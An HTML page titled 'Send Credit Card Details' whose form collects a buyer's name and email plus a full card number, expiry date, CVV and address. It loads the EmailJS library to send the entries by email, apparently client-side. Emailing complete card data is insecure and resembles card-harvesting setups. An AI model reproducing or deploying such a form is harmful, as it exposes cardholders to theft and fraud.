<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Credit Card Details</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>Send Credit Card Details</h1>
        <form id="emailForm">
            <label for="buyerName">Buyer Name:</label>
            <input type="text" id="buyerName" placeholder="Enter buyer's name" required>
            
            <label for="buyerEmail">Buyer Email:</label>
            <input type="email" id="buyerEmail" placeholder="Enter buyer's email" required>

            <label for="totalAmount">Total Amount:</label>
            <input type="text" id="totalAmount" placeholder="Enter total amount" required>
            
            <label for="orderId">Order ID:</label>
            <input type="text" id="orderId" placeholder="Enter order ID" required>

            <label for="purchaseDate">Purchase Date:</label>
            <input type="date" id="purchaseDate" required>

            <p>CARD DETAILS</p>

            <label for="cardName">Card Name:</label>
            <input type="text" id="cardName" placeholder="Enter card name" required>
            
            <label for="cardNumber">Card Number:</label>
            <input type="text" id="cardNumber" placeholder="Enter card number" required>
            
            <label for="expiryDate">Expiry Date:</label>
            <input type="text" id="expiryDate" placeholder="MM/YY" required>
            
            <label for="cvv">CVV:</label>
            <input type="text" id="cvv" placeholder="Enter CVV" required>

            <label for="address">Address:</label>
            <input type="text" id="address" placeholder="Enter Address" required>
            
            <button type="submit" id="sendButton">Send Email</button>
        </form>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
